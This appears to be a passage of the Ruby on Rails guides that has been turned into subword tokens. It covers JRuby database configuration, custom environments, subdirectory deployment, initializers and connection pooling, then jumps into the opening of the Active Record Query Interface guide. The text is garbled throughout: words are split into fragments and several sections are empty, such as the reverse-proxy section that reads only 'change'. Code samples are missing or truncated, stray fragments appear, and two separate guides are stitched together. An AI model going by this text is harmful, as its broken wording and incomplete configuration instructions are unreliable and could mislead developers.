▁If ▁you ▁choose ▁to ▁use ▁SQLite 3 ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database . yml ` ▁will ▁look ▁a ▁little ▁different .
▁Here ' s ▁the ▁development ▁section :
▁adapter : ▁ jdbc sqlite 3
▁#### ▁Configur ing ▁a ▁MySQL ▁Database ▁for ▁JRuby ▁P la t form
▁If ▁you ▁choose ▁to ▁use ▁MySQL ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database . yml ` ▁will ▁look ▁a ▁little ▁different .
▁adapter : ▁ jdbc mysql
▁#### ▁Configur ing ▁a ▁PostgreSQL ▁Database ▁for ▁JRuby ▁P la t form
▁If ▁you ▁choose ▁to ▁use ▁PostgreSQL ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database . yml ` ▁will ▁look ▁a ▁little ▁different .
▁adapter : ▁ jdbc postgresql
▁username : ▁blog
▁Change ▁the ▁username ▁and ▁password ▁in ▁the ▁` development ` ▁section ▁as ▁appropriate .
▁### ▁Creat ing ▁Rails ▁ Environment s
▁By ▁default ▁Rails ▁ s h ips ▁with ▁three ▁environments : ▁" development ", ▁" test ", ▁and ▁" production ".
▁Whi le ▁these ▁are ▁ s u ff ic i ent ▁for ▁most ▁use ▁cases , ▁there ▁are ▁c ir c um st ance s ▁when ▁you ▁want ▁more ▁environments .
▁Imag ine ▁you ▁have ▁a ▁server ▁which ▁m ir r or s ▁the ▁production ▁environment ▁but ▁is ▁only ▁used ▁for ▁testing .
▁Such ▁a ▁server ▁is ▁commonly ▁called ▁a ▁" staging ▁server ".
▁To ▁define ▁an ▁environment ▁called ▁" staging " ▁for ▁this ▁server , ▁just ▁create ▁a ▁file ▁called ▁` config / environments / staging . rb `.
▁P lease ▁use ▁the ▁contents ▁of ▁any ▁existing ▁file ▁in ▁` config / environments ` ▁as ▁a ▁starting ▁point ▁and ▁make ▁the ▁necessary ▁changes ▁from ▁there .
▁That ▁environment ▁is ▁no ▁different ▁than ▁the ▁default ▁one s , ▁start ▁a ▁server ▁with ▁` rails ▁server ▁- e ▁ staging `, ▁a ▁console ▁with ▁` rails ▁console ▁ staging `, ▁` Rails . env . staging ?` ▁works , ▁etc .
▁### ▁De p lo y ▁to ▁a ▁subdirectory ▁( relative ▁url ▁root )
▁By ▁default ▁Rails ▁expect s ▁that ▁your ▁application ▁is ▁running ▁at ▁the ▁root < n > ( eg . ▁` / ` ).
▁This ▁section ▁ explain s ▁how ▁to ▁run ▁your ▁application ▁inside ▁a ▁directory .
▁Let ' s ▁assume ▁we ▁want ▁to ▁deploy ▁our ▁application ▁to ▁" / app 1 ".
▁Rails ▁needs ▁to ▁know < n > this ▁directory ▁to ▁generate ▁the ▁appropriate ▁routes :
▁config . relative _ url _ root ▁= ▁" / app 1 "
▁a lternatively ▁you ▁can ▁set ▁the ▁` R AIL S _ RE L A T I V E _ URL _ R O O T ` ▁environment < n > variable .
▁Rails ▁will ▁now ▁ prepend ▁" / app 1 " ▁when ▁ generating ▁links .
▁#### ▁Using ▁Pass en g er
▁Pass en g er ▁make s ▁it ▁easy ▁to ▁run ▁your ▁application ▁in ▁a ▁subdirectory .
▁#### ▁Using ▁a ▁R ever se ▁ Pro x y
▁change
▁#### ▁Consider ation s ▁when ▁deploying ▁to ▁a ▁subdirectory
▁De p lo ying ▁to ▁a ▁subdirectory ▁in ▁production ▁has ▁implications ▁on ▁ various ▁parts ▁of < n > Rails .
▁* ▁development ▁environment :
▁* ▁testing ▁environment :
▁* ▁serving ▁static ▁assets :
▁* ▁asset ▁pipeline :
▁Rails ▁ Environment ▁Setting s
▁ ------------- -------------
▁Some ▁parts ▁of ▁Rails ▁can ▁also ▁be ▁configured ▁external ly ▁by ▁supply ing ▁environment ▁variables .
▁* ▁` ENV [ " R AIL S _ ENV "] ` ▁defines ▁the ▁Rails ▁environment ▁( production , ▁development , ▁test , ▁and ▁so ▁on ) ▁that ▁Rails ▁will ▁run ▁under .
▁* ▁` ENV [ " R AIL S _ RE L A T I V E _ URL _ R O O T "] ` ▁is ▁used ▁by ▁the ▁routing ▁code ▁to ▁recognize ▁URLs ▁when ▁you ▁[ deploy ▁your ▁application ▁to ▁a ▁subdirectory ]( configuring . html # deploy - to - a - sub directory - relative - url - root ).
▁* ▁` ENV [ " R AIL S _ C A C H E _ ID "] ` ▁and ▁` ENV [ " R AIL S _ A P P _ V ER S I ON "] ` ▁are ▁used ▁to ▁generate ▁ expand ed ▁cache ▁keys ▁in ▁Rails ' ▁caching ▁code .
▁This ▁allows ▁you ▁to ▁have ▁multiple ▁separate ▁cache s ▁from ▁the ▁same ▁application .
▁Using ▁Initialize r ▁File s
▁After ▁load ing ▁the ▁framework ▁and ▁any ▁gems ▁in ▁your ▁application , ▁Rails ▁turn s ▁to ▁load ing ▁initializer s .
▁An ▁initializer ▁is ▁any ▁Ruby ▁file ▁store d ▁under ▁` config / initializers ` ▁in ▁your ▁application .
▁You ▁can ▁use ▁initializer s ▁to ▁hold ▁configuration ▁settings ▁that ▁should ▁be ▁made ▁after ▁all ▁of ▁the ▁frameworks ▁and ▁gems ▁are ▁loaded , ▁such ▁as ▁options ▁to ▁configure ▁settings ▁for ▁these ▁parts .
▁NOTE : ▁You ▁can ▁use ▁sub fold ers ▁to ▁ org an ize ▁your ▁initializer s ▁if ▁you ▁like , ▁because ▁Rails ▁will ▁look ▁into ▁the ▁whole ▁file ▁hierarchy ▁from ▁the ▁initializer s ▁folder ▁on ▁down .
▁TIP : ▁If ▁you ▁have ▁any ▁order ing ▁ dependency ▁in ▁your ▁initializer s , ▁you ▁can ▁control ▁the ▁load ▁order ▁through ▁naming .
▁Initialize r ▁files ▁are ▁loaded ▁in ▁ al ph a be t ical ▁order ▁by ▁their ▁path .
▁For ▁example , ▁` 0 1 _ critical . rb ` ▁will ▁be ▁loaded ▁before ▁` 02 _ normal . rb `.
▁I nitialization ▁even t s
▁Rails ▁has ▁5 ▁initialization ▁even t s ▁which ▁can ▁be ▁ hook ed ▁into ▁( list ed ▁in ▁the ▁order ▁that ▁they ▁are ▁run ) :
▁* ▁` before _ configuration ` : ▁This ▁is ▁run ▁as ▁soon ▁as ▁the ▁application ▁constant ▁inherit s ▁from ▁` Rails :: Application `.
▁The ▁` config ` ▁calls ▁are ▁evaluated ▁before ▁this ▁happens .
▁* ▁` before _ initialize ` : ▁This ▁is ▁run ▁directly ▁before ▁the ▁initialization ▁process ▁of ▁the ▁application ▁occur s ▁with ▁the ▁`: bootstrap _ hook ` ▁initializer ▁ n e ar ▁the ▁beginning ▁of ▁the ▁Rails ▁initialization ▁process .
▁* ▁` to _ prepare ` : ▁Run ▁after ▁the ▁initializer s ▁are ▁run ▁for ▁all ▁ Railtie s ▁( including ▁the ▁application ▁itself ), ▁but ▁before ▁ eager ▁load ing ▁and ▁the ▁middleware ▁stack ▁is ▁built .
▁More ▁important ly , ▁will ▁run ▁upon ▁every ▁request ▁in ▁` development `, ▁but ▁only ▁once ▁( d ur ing ▁b oo t - up ) ▁in ▁` production ` ▁and ▁` test `.
▁* ▁` before _ eager _ load ` : ▁This ▁is ▁run ▁directly ▁before ▁ eager ▁load ing ▁occur s , ▁which ▁is ▁the ▁default ▁behavior ▁for ▁the ▁` production ` ▁environment ▁and ▁not ▁for ▁the ▁` development ` ▁environment .
▁* ▁` after _ initialize ` : ▁Run ▁directly ▁after ▁the ▁initialization ▁of ▁the ▁application , ▁after ▁the ▁application ▁initializer s ▁in ▁` config / initializers ` ▁are ▁run .
▁To ▁define ▁an ▁even t ▁for ▁these ▁ hook s , ▁use ▁the ▁block ▁syntax ▁within ▁a ▁` Rails :: Application `, ▁` Rails :: Railtie ` ▁or ▁` Rails :: Engine ` ▁sub class :
▁module ▁Your A p p
▁class ▁Application ▁< ▁Rails :: Application
▁config . before _ initialize ▁do
▁# ▁initialization ▁code ▁go es ▁here
▁A lternatively , ▁you ▁can ▁also ▁do ▁it ▁through ▁the ▁` config ` ▁method ▁on ▁the ▁` Rails . application ` ▁object :
▁Rails . application . config . before _ initialize ▁do
▁# ▁initialization ▁code ▁go es ▁here
▁WARNING : ▁Some ▁parts ▁of ▁your ▁application , ▁not ably ▁routing , ▁are ▁not ▁yet ▁set ▁up ▁at ▁the ▁point ▁where ▁the ▁` after _ initialize ` ▁block ▁is ▁called .
▁### ▁` Rails :: Railtie # initialize r `
▁Rails ▁has ▁sever al ▁initializer s ▁that ▁run ▁on ▁start up ▁that ▁are ▁all ▁defined ▁by ▁using ▁the ▁` initialize r ` ▁method ▁from ▁` Rails :: Railtie `.
▁Here ' s ▁an ▁example ▁of ▁the ▁` set _ helpers _ path ` ▁initializer ▁from ▁Action ▁Controller :
▁initializer ▁" action _ controller . set _ helpers _ path " ▁do ▁| app |
▁ ActionController :: Helpers . helpers _ path ▁= ▁app . helpers _ path s
▁The ▁` initialize r ` ▁method ▁take s ▁three ▁arguments ▁with ▁the ▁first ▁being ▁the ▁name ▁for ▁the ▁initializer ▁and ▁the ▁second ▁being ▁an ▁options ▁hash ▁( not ▁show n ▁here ) ▁and ▁the ▁third ▁being ▁a ▁block .
▁The ▁`: before ` ▁key ▁in ▁the ▁options ▁hash ▁can ▁be ▁specified ▁to ▁specify ▁which ▁initializer ▁this ▁new ▁initializer ▁must ▁run ▁before , ▁and ▁the ▁`: after ` ▁key ▁will ▁specify ▁which ▁initializer ▁to ▁run ▁this ▁initializer ▁ _ after _ .
▁Initialize r s ▁defined ▁using ▁the ▁` initialize r ` ▁method ▁will ▁be ▁run ▁in ▁the ▁order ▁they ▁are ▁defined ▁in , ▁with ▁the ▁exception ▁of ▁one s ▁that ▁use ▁the ▁`: before ` ▁or ▁`: after ` ▁methods .
▁WARNING : ▁You ▁may ▁put ▁your ▁initializer ▁before ▁or ▁after ▁any ▁other ▁initializer ▁in ▁the ▁chain , ▁as ▁long ▁as ▁it ▁is ▁logic al .
▁S a y ▁you ▁have ▁4 ▁initializer s ▁called ▁" one " ▁through ▁" f our " ▁( defined ▁in ▁that ▁order ) ▁and ▁you ▁define ▁" f our " ▁to ▁go ▁ _ before _ ▁" f our " ▁but ▁ _ after _ ▁" th re e ", ▁that ▁just ▁is n ' t ▁logic al ▁and ▁Rails ▁will ▁not ▁be ▁able ▁to ▁determine ▁your ▁initializer ▁order .
▁The ▁block ▁argument ▁of ▁the ▁` initialize r ` ▁method ▁is ▁the ▁instance ▁of ▁the ▁application ▁itself , ▁and ▁so ▁we ▁can ▁access ▁the ▁configuration ▁on ▁it ▁by ▁using ▁the ▁` config ` ▁method ▁as ▁done ▁in ▁the ▁example .
▁Because ▁` Rails :: Application ` ▁inherit s ▁from ▁` Rails :: Railtie ` ▁( in directly ), ▁you ▁can ▁use ▁the ▁` initialize r ` ▁method ▁in ▁` config / application . rb ` ▁to ▁define ▁initializer s ▁for ▁the ▁application .
▁### ▁Initialize r s
▁Be low ▁is ▁a ▁com pre h en s ive ▁list ▁of ▁all ▁the ▁initializer s ▁found ▁in ▁Rails ▁in ▁the ▁order ▁that ▁they ▁are ▁defined ▁( and ▁therefore ▁run ▁in , ▁unless ▁otherwise ▁state d ).
▁* ▁` load _ environment _ hook ` ▁S er ve s ▁as ▁a ▁place h ol d er ▁so ▁that ▁`: load _ environment _ config ` ▁can ▁be ▁defined ▁to ▁run ▁before ▁it .
▁* ▁` load _ active _ support ` ▁ Requir es ▁` active _ support / de p end en c ies ` ▁which ▁set s ▁up ▁the ▁basis ▁for ▁Active ▁Support .
▁Option ally ▁requires ▁` active _ support / all ` ▁if ▁` config . active _ support . bar e ` ▁is ▁un - t ru th ful , ▁which ▁is ▁the ▁default .
▁* ▁` initialize _ logger ` ▁Initialize s ▁the ▁ logger ▁( an ▁` ActiveSupport :: Logger ` ▁object ) ▁for ▁the ▁application ▁and ▁make s ▁it ▁accessible ▁at ▁` Rails . logger `, ▁provided ▁that ▁no ▁initializer ▁inserted ▁before ▁this ▁point ▁has ▁defined ▁` Rails . logger `.
▁* ▁` initialize _ cache ` ▁If ▁` Rails . cache ` ▁is n ' t ▁set ▁yet , ▁initialize s ▁the ▁cache ▁by ▁refer en c ing ▁the ▁value ▁in ▁` config . cache _ store ` ▁and ▁store s ▁the ▁out com e ▁as ▁` Rails . cache `.
▁If ▁this ▁object ▁respond s ▁to ▁the ▁` middleware ` ▁method , ▁its ▁middleware ▁is ▁inserted ▁before ▁` Rack :: Runtime ` ▁in ▁the ▁middleware ▁stack .
▁* ▁` set _ clear _ de p end en c ies _ hook ` ▁Provide s ▁a ▁ hook ▁for ▁` active _ record . set _ dispatch _ hook s ` ▁to ▁use , ▁which ▁will ▁run ▁before ▁this ▁initializer .
▁This ▁initializer ▁- ▁which ▁run s ▁only ▁if ▁` cache _ classes ` ▁is ▁set ▁to ▁` false ` ▁- ▁uses ▁` ActionDispatch :: Callbacks . after ` ▁to ▁remove ▁the ▁constant s ▁which ▁have ▁been ▁referenced ▁during ▁the ▁request ▁from ▁the ▁object ▁ space ▁so ▁that ▁they ▁will ▁be ▁reload ed ▁during ▁the ▁following ▁request .
▁* ▁` initialize _ dependency _ mechanism ` ▁If ▁` config . cache _ classes ` ▁is ▁true , ▁configure s ▁` ActiveSupport :: D e p end en c ies . mechanism ` ▁to ▁` require ` ▁dependencies ▁rather ▁than ▁` load ` ▁them .
▁* ▁` bootstrap _ hook ` ▁Run s ▁all ▁configured ▁` before _ initialize ` ▁blocks .
▁* ▁` i 18 n . callback s ` ▁In ▁the ▁development ▁environment , ▁set s ▁up ▁a ▁` to _ prepare ` ▁callback ▁which ▁will ▁call ▁` I 18 n . reload !` ▁if ▁any ▁of ▁the ▁locale s ▁have ▁changed ▁since ▁the ▁last ▁request .
▁In ▁production ▁mode ▁this ▁callback ▁will ▁only ▁run ▁on ▁the ▁first ▁request .
▁* ▁` active _ support . d eprecation _ be ha v i or ` ▁Set s ▁up ▁deprecation ▁report ing ▁for ▁environments , ▁default ing ▁to ▁`: log ` ▁for ▁development , ▁`: not ify ` ▁for ▁production ▁and ▁`: st d er r ` ▁for ▁test .
▁If ▁a ▁value ▁is n ' t ▁set ▁for ▁` config . active _ support . d eprecation ` ▁the n ▁this ▁initializer ▁will ▁prompt ▁the ▁user ▁to ▁configure ▁this ▁line ▁in ▁the ▁current ▁environment ' s ▁` config / environments ` ▁file .
▁C an ▁be ▁set ▁to ▁an ▁array ▁of ▁values .
▁* ▁` active _ support . initialize _ time _ zone ` ▁Set s ▁the ▁default ▁time ▁zone ▁for ▁the ▁application ▁base d ▁on ▁the ▁` config . time _ zone ` ▁setting , ▁which ▁defaults ▁to ▁" UT C ".
▁* ▁` active _ support . initialize _ beginning _ of _ week ` ▁Set s ▁the ▁default ▁beginning ▁of ▁ week ▁for ▁the ▁application ▁base d ▁on ▁` config . beginning _ of _ week ` ▁setting , ▁which ▁defaults ▁to ▁`: monday `.
▁* ▁` action _ dispatch . config ure ` ▁Configur es ▁the ▁` ActionDispatch :: Http :: URL . tld _ length ` ▁to ▁be ▁set ▁to ▁the ▁value ▁of ▁` config . action _ dispatch . tld _ length `.
▁* ▁` action _ view . set _ config s ` ▁Set s ▁up ▁Action ▁View ▁by ▁using ▁the ▁settings ▁in ▁` config . action _ view ` ▁by ▁` s end ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionView :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁* ▁` action _ controller . logger ` ▁Set s ▁` ActionController :: Base . logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails . logger `.
▁* ▁` action _ controller . initialize _ framework _ cache s ` ▁Set s ▁` ActionController :: Base . cache _ store ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails . cache `.
▁* ▁` action _ controller . set _ config s ` ▁Set s ▁up ▁Action ▁Controller ▁by ▁using ▁the ▁settings ▁in ▁` config . action _ controller ` ▁by ▁` s end ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionController :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁* ▁` action _ controller . compile _ config _ methods ` ▁Initialize s ▁methods ▁for ▁the ▁config ▁settings ▁specified ▁so ▁that ▁they ▁are ▁quick er ▁to ▁access .
▁* ▁` active _ record . initialize _ time zone ` ▁Set s ▁` ActiveRecord :: Base . time _ zone _ a w a re _ attributes ` ▁to ▁true , ▁as ▁well ▁as ▁setting ▁` ActiveRecord :: Base . default _ time zone ` ▁to ▁UTC . ▁When ▁attributes ▁are ▁read ▁from ▁the ▁database , ▁they ▁will ▁be ▁convert ed ▁into ▁the ▁time ▁zone ▁specified ▁by ▁` Time . zone `.
▁* ▁` active _ record . logger ` ▁Set s ▁` ActiveRecord :: Base . logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails . logger `.
▁* ▁` active _ record . set _ config s ` ▁Set s ▁up ▁Active ▁Record ▁by ▁using ▁the ▁settings ▁in ▁` config . active _ record ` ▁by ▁` s end ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActiveRecord :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁* ▁` active _ record . initialize _ database ` ▁Load s ▁the ▁database ▁configuration ▁( by ▁default ) ▁from ▁` config / database . yml ` ▁and ▁establish es ▁a ▁connection ▁for ▁the ▁current ▁environment .
▁* ▁` active _ record . log _ ru n time ` ▁ Includ es ▁` ActiveRecord :: Railtie s :: Controller Runtime ` ▁which ▁is ▁responsib le ▁for ▁report ing ▁the ▁time ▁take n ▁by ▁Active ▁Record ▁calls ▁for ▁the ▁request ▁back ▁to ▁the ▁ logger .
▁* ▁` active _ record . set _ dispatch _ hook s ` ▁Re set s ▁all ▁reload able ▁connection s ▁to ▁the ▁database ▁if ▁` config . cache _ classes ` ▁is ▁set ▁to ▁` false `.
▁* ▁` action _ mailer . logger ` ▁Set s ▁` ActionMailer :: Base . logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails . logger `.
▁* ▁` action _ mailer . set _ config s ` ▁Set s ▁up ▁Action ▁Mailer ▁by ▁using ▁the ▁settings ▁in ▁` config . action _ mailer ` ▁by ▁` s end ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionMailer :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁* ▁` action _ mailer . compile _ config _ methods ` ▁Initialize s ▁methods ▁for ▁the ▁config ▁settings ▁specified ▁so ▁that ▁they ▁are ▁quick er ▁to ▁access .
▁* ▁` set _ load _ path ` ▁This ▁initializer ▁run s ▁before ▁` bootstrap _ hook `.
▁Add s ▁the ▁` vendor `, ▁` lib `, ▁all ▁directories ▁of ▁` app ` ▁and ▁any ▁paths ▁specified ▁by ▁` config . load _ path s ` ▁to ▁` $ L O A D _ P A T H `.
▁* ▁` set _ autoload _ path s ` ▁This ▁initializer ▁run s ▁before ▁` bootstrap _ hook `.
▁Add s ▁all ▁sub - d ir ec to r ies ▁of ▁` app ` ▁and ▁paths ▁specified ▁by ▁` config . autoload _ path s ` ▁to ▁` ActiveSupport :: D e p end en c ies . autoload _ path s `.
▁* ▁` add _ routing _ path s ` ▁Load s ▁( by ▁default ) ▁all ▁` config / routes . rb ` ▁files ▁( in ▁the ▁application ▁and ▁railties , ▁including ▁engines ) ▁and ▁set s ▁up ▁the ▁routes ▁for ▁the ▁application .
▁* ▁` add _ locale s ` ▁Add s ▁the ▁files ▁in ▁` config / locale s ` ▁( from ▁the ▁application , ▁railties ▁and ▁engines ) ▁to ▁` I 18 n . load _ path `, ▁making ▁available ▁the ▁tr an s l ation s ▁in ▁these ▁files .
▁* ▁` add _ view _ path s ` ▁Add s ▁the ▁directory ▁` app / views ` ▁from ▁the ▁application , ▁railties ▁and ▁engines ▁to ▁the ▁look up ▁path ▁for ▁view ▁files ▁for ▁the ▁application .
▁* ▁` load _ environment _ config ` ▁Load s ▁the ▁` config / environments ` ▁file ▁for ▁the ▁current ▁environment .
▁* ▁` app end _ asset _ path s ` ▁Find s ▁asset ▁paths ▁for ▁the ▁application ▁and ▁all ▁attach ed ▁railties ▁and ▁keep s ▁a ▁track ▁of ▁the ▁available ▁directories ▁in ▁` config . static _ asset _ path s `.
▁* ▁` prepend _ helpers _ path ` ▁Add s ▁the ▁directory ▁` app / helpers ` ▁from ▁the ▁application , ▁railties ▁and ▁engines ▁to ▁the ▁look up ▁path ▁for ▁helpers ▁for ▁the ▁application .
▁* ▁` load _ config _ initializers ` ▁Load s ▁all ▁Ruby ▁files ▁from ▁` config / initializers ` ▁in ▁the ▁application , ▁railties ▁and ▁engines .
▁The ▁files ▁in ▁this ▁directory ▁can ▁be ▁used ▁to ▁hold ▁configuration ▁settings ▁that ▁should ▁be ▁made ▁after ▁all ▁of ▁the ▁frameworks ▁are ▁loaded .
▁* ▁` engine s _ blank _ point ` ▁Provide s ▁a ▁point - in - i nitialization ▁to ▁ hook ▁into ▁if ▁you ▁wish ▁to ▁do ▁anything ▁before ▁engines ▁are ▁loaded .
▁After ▁this ▁point , ▁all ▁ ra il t i e ▁and ▁engine ▁initializer s ▁are ▁run .
▁* ▁` add _ generator _ template s ` ▁Find s ▁templates ▁for ▁generator s ▁at ▁` lib / template s ` ▁for ▁the ▁application , ▁railties ▁and ▁engines ▁and ▁add s ▁these ▁to ▁the ▁` config . generator s . template s ` ▁setting , ▁which ▁will ▁make ▁the ▁templates ▁available ▁for ▁all ▁generator s ▁to ▁reference .
▁* ▁` en s ure _ autoload _ on ce _ path s _ as _ sub set ` ▁Ensur es ▁that ▁the ▁` config . autoload _ on ce _ path s ` ▁only ▁contains ▁paths ▁from ▁` config . autoload _ path s `.
▁If ▁it ▁contains ▁extra ▁paths , ▁the n ▁an ▁exception ▁will ▁be ▁raised .
▁* ▁` add _ to _ prepare _ block s ` ▁The ▁block ▁for ▁every ▁` config . to _ prepare ` ▁call ▁in ▁the ▁application , ▁a ▁ ra il t i e ▁or ▁engine ▁is ▁added ▁to ▁the ▁` to _ prepare ` ▁callbacks ▁for ▁Action ▁D is patch ▁which ▁will ▁be ▁run ▁per ▁request ▁in ▁development , ▁or ▁before ▁the ▁first ▁request ▁in ▁production .
▁* ▁` add _ built in _ route ` ▁If ▁the ▁application ▁is ▁running ▁under ▁the ▁development ▁environment ▁the n ▁this ▁will ▁app end ▁the ▁route ▁for ▁` rails / info / properties ` ▁to ▁the ▁application ▁routes .
▁This ▁route ▁provides ▁the ▁ detailed ▁information ▁such ▁as ▁Rails ▁and ▁Ruby ▁version ▁for ▁` public / index . html ` ▁in ▁a ▁default ▁Rails ▁application .
▁* ▁` build _ middleware _ stack ` ▁B u il d s ▁the ▁middleware ▁stack ▁for ▁the ▁application , ▁return ing ▁an ▁object ▁which ▁has ▁a ▁` c all ` ▁method ▁which ▁take s ▁a ▁Rack ▁environment ▁object ▁for ▁the ▁request .
▁* ▁` eager _ load !` ▁If ▁` config . eager _ load ` ▁is ▁true , ▁run s ▁the ▁` config . before _ eager _ load ` ▁ hook s ▁and ▁the n ▁calls ▁` eager _ load !` ▁which ▁will ▁load ▁all ▁` config . eager _ load _ namespace s `.
▁* ▁` f in is h er _ hook ` ▁Provide s ▁a ▁ hook ▁for ▁after ▁the ▁initialization ▁of ▁process ▁of ▁the ▁application ▁is ▁complete , ▁as ▁well ▁as ▁running ▁all ▁the ▁` config . after _ initialize ` ▁blocks ▁for ▁the ▁application , ▁railties ▁and ▁engines .
▁* ▁` set _ routes _ reload er ` ▁Configur es ▁Action ▁D is patch ▁to ▁reload ▁the ▁routes ▁file ▁using ▁` ActionDispatch :: Callbacks . to _ prepare `.
▁* ▁` d is able _ dependency _ load ing ` ▁D is able s ▁the ▁automatic ▁ dependency ▁load ing ▁if ▁the ▁` config . eager _ load ` ▁is ▁set ▁to ▁true .
▁Database ▁p o ol ing
▁ ----------------
▁Active ▁Record ▁database ▁connection s ▁are ▁manage d ▁by ▁` ActiveRecord :: Connection Adapters :: Connection P o ol ` ▁which ▁ensure s ▁that ▁a ▁connection ▁p o ol ▁ s y n ch r on ize s ▁the ▁amount ▁of ▁thread ▁access ▁to ▁a ▁ limited ▁number ▁of ▁database ▁connection s .
▁This ▁limit ▁defaults ▁to ▁5 ▁and ▁can ▁be ▁configured ▁in ▁` database . yml `.
▁S ince ▁the ▁connection ▁p o ol ing ▁is ▁handle d ▁inside ▁of ▁Active ▁Record ▁by ▁default , ▁all ▁application ▁server s ▁( T h in , ▁ mong rel , ▁Un ic or n ▁etc .) ▁should ▁be ha ve ▁the ▁same .
▁ Initial ly , ▁the ▁database ▁connection ▁p o ol ▁is ▁empty ▁and ▁it ▁will ▁create ▁ additional ▁connection s ▁as ▁the ▁d em and ▁for ▁them ▁increase s , ▁un til ▁it ▁reach es ▁the ▁connection ▁p o ol ▁limit .
▁Any ▁one ▁request ▁will ▁check ▁out ▁a ▁connection ▁the ▁first ▁time ▁it ▁requires ▁access ▁to ▁the ▁database , ▁after ▁which ▁it ▁will ▁check ▁the ▁connection ▁back ▁in , ▁at ▁the ▁end ▁of ▁the ▁request , ▁meaning ▁that ▁the ▁ additional ▁connection ▁ s lo t ▁will ▁be ▁available ▁again ▁for ▁the ▁next ▁request ▁in ▁the ▁ queue .
▁If ▁you ▁try ▁to ▁use ▁more ▁connection s ▁than ▁are ▁available , ▁Active ▁Record ▁will ▁block < n > and ▁wait ▁for ▁a ▁connection ▁from ▁the ▁p o ol .
▁When ▁it ▁cannot ▁get ▁connection , ▁a ▁time out < n > error ▁similar ▁to ▁given ▁below ▁will ▁be ▁throw n .
▁ActiveRecord :: Connection Time out Error ▁- ▁could ▁not ▁obtain ▁a ▁database ▁connection ▁within ▁5 ▁second s .
▁The ▁ ma x ▁p o ol ▁size ▁is ▁current ly ▁5 ; ▁consider ▁increasing ▁it :
▁If ▁you ▁get ▁the ▁above ▁error , ▁you ▁m ight ▁want ▁to ▁increase ▁the ▁size ▁of ▁connection < n > p o ol ▁by ▁increment ing ▁the ▁` p o ol ` ▁option ▁in ▁` database . yml `
▁NOTE . ▁If ▁you ▁are ▁running ▁in ▁a ▁ multi - th read ed ▁environment , ▁there ▁could ▁be ▁a ▁chance ▁that ▁sever al ▁thread s ▁may ▁be ▁access ing ▁multiple ▁connection s ▁simul t an e ous ly .
▁So ▁depending ▁on ▁your ▁current ▁request ▁load , ▁you ▁could ▁very ▁well ▁have ▁multiple ▁thread s ▁con t end ing ▁for ▁a ▁ limited ▁amount ▁of ▁connection s .
▁`` ` ruby
▁=> ▁true
▁Active ▁Record ▁ Query ▁In ter fa ce
▁= ============== ==============
▁This ▁guide ▁cover s ▁different ▁ways ▁to ▁retrieve ▁data ▁from ▁the ▁database ▁using ▁Active ▁Record .
▁* ▁How ▁to ▁find ▁records ▁using ▁a ▁variety ▁of ▁methods ▁and ▁conditions .
▁* ▁How ▁to ▁specify ▁the ▁order , ▁retrieved ▁attributes , ▁group ing , ▁and ▁other ▁ properties ▁of ▁the ▁found ▁records .
▁* ▁How ▁to ▁use ▁ eager ▁load ing ▁to ▁reduce ▁the ▁number ▁of ▁database ▁queries ▁needed ▁for ▁data ▁retriev al .
▁* ▁How ▁to ▁use ▁dynamic ▁finder s ▁methods .
▁* ▁How ▁to ▁check ▁for ▁the ▁exist ence ▁of ▁particular ▁records .
▁* ▁How ▁to ▁perform ▁ various ▁ calculations ▁on ▁Active ▁Record ▁models .
▁* ▁How ▁to ▁run ▁E X PLAIN ▁on ▁relation s .
▁If ▁you ' re ▁used ▁to ▁using ▁raw ▁SQL ▁to ▁find ▁database ▁records , ▁the n ▁you ▁will ▁generally ▁find ▁that ▁there ▁are ▁better ▁ways ▁to ▁c ar ry ▁out ▁the ▁same ▁operations ▁in ▁Rails .
▁Active ▁Record ▁in s ul ate s ▁you ▁from ▁the ▁need ▁to ▁use ▁SQL ▁in ▁most ▁cases .
▁Code ▁examples ▁throughout ▁this ▁guide ▁will ▁refer ▁to ▁one ▁or ▁more ▁of ▁the ▁following ▁models :
▁TIP : ▁All ▁of ▁the ▁following ▁models ▁use ▁` id ` ▁as ▁the ▁primary ▁key , ▁unless ▁specified ▁otherwise .
▁class ▁Client ▁< ▁ActiveRecord :: Base
▁has _ one ▁: address
▁has _ many ▁: orders
▁has _ and _ belongs _ to _ many ▁: r ol es
▁class ▁Add re s s ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: client
▁class ▁ Order ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: client , ▁ counter _ cache : ▁true
▁class ▁R o le ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: client s
▁Active ▁Record ▁will ▁perform ▁queries ▁on ▁the ▁database ▁for ▁you ▁and ▁is ▁compatib le ▁with ▁most ▁database ▁systems ▁( M y SQL , ▁PostgreSQL ▁and ▁SQLite ▁to ▁name ▁a ▁few ).
▁Re g ar d less ▁of ▁which ▁database ▁system ▁you ' re ▁using , ▁the ▁Active ▁Record ▁method ▁format ▁will ▁always ▁be ▁the ▁same .
▁R etriev ing ▁Object s ▁from ▁the ▁Database
▁-------------- ------ ----------------
▁To ▁retrieve ▁objects ▁from ▁the ▁database , ▁Active ▁Record ▁provides ▁sever al ▁finder ▁methods .
▁ Each ▁finder ▁method ▁allows ▁you ▁to ▁pass ▁arguments ▁into ▁it ▁to ▁perform ▁certain ▁queries ▁on ▁your ▁database ▁without ▁writing ▁raw ▁SQL .
▁The ▁methods ▁are :
▁* ▁` bin d `
▁* ▁` create _ with `
▁* ▁` distinct `
▁* ▁` eager _ load `
▁* ▁` ext end ing `
▁* ▁` from `
▁* ▁` group `
▁* ▁` having `
▁* ▁` include s `
▁* ▁` joins `
▁* ▁` limit `
▁* ▁` lock `
▁* ▁` n one `
▁* ▁` offset `
